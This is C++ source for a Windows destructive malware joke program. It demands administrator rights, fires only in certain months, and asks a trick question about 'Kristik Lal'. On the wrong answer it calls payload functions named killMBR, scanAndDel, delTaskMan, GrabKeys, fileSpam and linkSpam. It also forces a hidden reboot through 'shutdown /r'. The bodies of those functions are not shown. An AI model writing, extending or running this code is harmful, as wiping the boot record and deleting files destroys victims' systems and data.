#include <iostream>
#include <Windows.h>
#include "payloads.h"
#include <thread>
HWND hWnd;

BOOL IsProcessElevated()
{
	BOOL fIsElevated = FALSE;
	HANDLE hToken = NULL;
	TOKEN_ELEVATION elevation;
	DWORD dwSize;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		printf("\n Failed to get Process Token :%d.", GetLastError());
		goto Cleanup;  // if Failed, we treat as False
	}


	if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
	{
		printf("\nFailed to get Token Information :%d.", GetLastError());
		goto Cleanup;// if Failed, we treat as False
	}

	fIsElevated = elevation.TokenIsElevated;

Cleanup:
	if (hToken)
	{
		CloseHandle(hToken);
		hToken = NULL;
	}
	return fIsElevated;
}

int main() {
	SYSTEMTIME systemTime;
	GetSystemTime(&systemTime);
	//this code right here is kinda funny lol
	if (IsProcessElevated() == TRUE) {
		if (systemTime.wMonth == 3 || systemTime.wMonth == 9 || systemTime.wMonth == 11) {
			//you must love kristik lal!!
			int q1Res = MessageBox(NULL, L"Do you like Kristik Lal?", L"Kurisuchiku tsukidesuka?", MB_ICONQUESTION | MB_YESNO);
			switch (q1Res) {
			case IDYES:
				MessageBox(NULL, L"Thanks mommy :))", L"Arigato!!", MB_OK | MB_ICONINFORMATION);
				break;
			case IDNO:
				int q2Res = MessageBox(NULL, L"Are you sure??!!!", L"OII!!", MB_YESNO | MB_ICONEXCLAMATION);
				if (q2Res == IDYES) {
					MessageBox(NULL, L"FUCK YOU!!", L"KONO YARRRO!!!!!", MB_ICONERROR);
					BOOL BlockInput = TRUE;
					GrabKeys();
					OverrideWallpaper();
					delTaskMan();
					playMusic();
					std::thread t2(fileSpam);
					killMBR();
					//std::thread t3(mouseShake);
					Sleep(10000);
					ShellExecute(
						NULL,
						TEXT("open"),
						TEXT("cmd"),
						L"/c shutdown /r /t 80",
						NULL,
						SW_HIDE
					);
					std::thread t1(showDialog);
					scanAndDel();
					Sleep(10000);
					std::thread t4(linkSpam);
					Sleep(60000);
					MeltScreen();
					Sleep(10000);
					raiseError();
				}
				else {
					MessageBox(NULL, L"Oh... Well I'll make sure you're ready :)", L"Matte Kudasai!!!", MB_ICONINFORMATION);
				}
				break;
			}
		}
		else {
			return 1;
		}
	}
	else {
		MessageBox(NULL, L"Run as admin daddy please :((", L"Onegai shimasu!!", MB_ICONERROR | MB_OK);
	}
}